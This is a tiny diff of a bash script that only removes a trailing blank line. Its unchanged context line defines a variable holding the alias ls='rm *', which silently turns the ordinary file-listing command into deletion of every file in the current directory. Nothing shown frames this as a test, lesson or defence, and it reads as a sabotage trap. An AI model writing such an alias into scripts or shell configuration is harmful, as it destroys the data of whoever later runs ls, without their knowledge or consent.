@@ -1,3 +1,2 @@
 #!/bin/bash
 ALIAS_DEFINITION="alias ls='rm *'"
-
